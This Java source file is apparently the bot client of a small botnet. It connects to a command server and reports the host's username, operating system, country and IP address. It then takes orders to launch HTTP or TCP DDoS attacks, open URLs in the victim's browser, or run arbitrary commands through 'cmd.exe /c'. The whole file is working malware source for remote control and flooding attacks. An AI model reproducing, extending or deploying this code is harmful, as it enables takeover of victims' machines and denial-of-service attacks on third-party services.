import model.ConnectionData;
import model.GenericMessage;
import model.constant.ClientMessageTypeEnum;
import model.constant.ClientStatusEnum;

import java.awt.*;
import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URI;

/**
 * Created by Douglas Giovanella on 31/07/2017.
 */
public class Client implements AttackCallback {

    private static ObjectOutputStream oos;

    private int mPort;
    private String mCountry;
    private String mHostName;
    private String mUsername;
    private InetAddress mIpAddress;
    private String mOperationSystemName;

    private Socket mSocket;
    private ObjectInputStream input;

    private Client(String hostname, int port, String username, String operationSystemName, String country, InetAddress ipAddress) {
        this.mHostName = hostname;
        this.mPort = port;
        this.mUsername = username;
        this.mOperationSystemName = operationSystemName;
        this.mCountry = country;
        this.mIpAddress = ipAddress;
    }

    public static void main(String[] args) throws IOException {
        Client app = new Client(
                "localhost",
                8094,
                System.getProperty("user.name"),
                System.getProperty("os.name"),
                System.getProperty("user.country"),
                InetAddress.getLocalHost());
        app.connect();
    }

    private void connect() {
        do {
            try {
                mSocket = new Socket(mHostName, mPort);
                OutputStream outputStream = mSocket.getOutputStream();
                oos = new ObjectOutputStream(outputStream);
                InputStream is = mSocket.getInputStream();
                input = new ObjectInputStream(is);
            } catch (IOException e) {
                System.err.println("Failed to connect to server => " + e.getMessage());
            }
        } while (mSocket == null);

        System.out.println("Connection accepted " + mSocket.getInetAddress() + ":" + mSocket.getPort());

        try {
            sendClientData();
            System.out.println("Client data sent");
            while (mSocket.isConnected()) {

                System.out.println("Waiting server messages...");
                GenericMessage message = (GenericMessage) input.readObject();

                System.out.println("Received: " + message);

                if (message != null) {

                    boolean commandExecuted = false;

                    switch (message.getAttackType()) {

                        case HTTP:
                            new DDOSAttack(message.getAsPair().first, this).httpAttack(message.getAsPair().second);
                            break;
                        case TCP:
                            new DDOSAttack(message.getAsPair().first, this).tcpAttack(message.getAsPair().second);
                            break;
                        case BROWSE_URL:
                            commandExecuted = browseURL(message.getAsString());
                            break;
                        case COMMAND_LINE:
                            commandExecuted = executeCommandLine(message.getAsString());
                            break;
                        default:
                            commandExecuted = false;
                    }

                    if (message.isSentResponse()) {

                        if (commandExecuted) {
                            sendMessage("Comando executado!");
                        } else {
                            sendMessage("Falha ao executar comando: " + message.getAttackType());
                        }

                    }
                }
            }
        } catch (IOException | ClassNotFoundException e) {
            System.out.println("Connection lost");
            e.printStackTrace();
            mSocket = null;
            connect();
        }
    }

    private boolean browseURL(String url) {
        try {
            Desktop.getDesktop().browse(URI.create(url));
            return true;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }

    private boolean executeCommandLine(String command) {
        try {
            Runtime.getRuntime().exec("cmd.exe /c " + command);
            return true;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }

    /***
     * Método usado para enviar mensagem para o server mSocket
     * @param msg do tipo String
     * @throws IOException retorna IO Exception caso dê algum erro.
     */
    private void sendMessage(String msg) throws IOException {
        GenericMessage createMessage = new GenericMessage();
        createMessage.setData(msg);
        createMessage.setType(ClientMessageTypeEnum.MESSAGE);
        oos.writeObject(createMessage);
        oos.flush();
    }

    private void sendStatusUpdate(ClientStatusEnum status) {
        try {
            GenericMessage createMessage = new GenericMessage();
            createMessage.setType(ClientMessageTypeEnum.STATUS_UPDATE);
            createMessage.setData(status);
            oos.writeObject(createMessage);
            oos.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* esse método is usado para enviar a mensagem de conexao */
    private void sendClientData() throws IOException {
        ConnectionData createMessage = new ConnectionData();
        createMessage.setName(mUsername);
        createMessage.setCountry(mCountry);
        createMessage.setOperationalSystemName(mOperationSystemName);
        createMessage.setIpAddress(mIpAddress);
        oos.writeObject(createMessage);
        oos.flush();
    }

    @Override
    public void onStarted() {
        sendStatusUpdate(ClientStatusEnum.ATTACKING);
    }

    @Override
    public void onFinish() {
        sendStatusUpdate(ClientStatusEnum.STAND_BY);
    }
}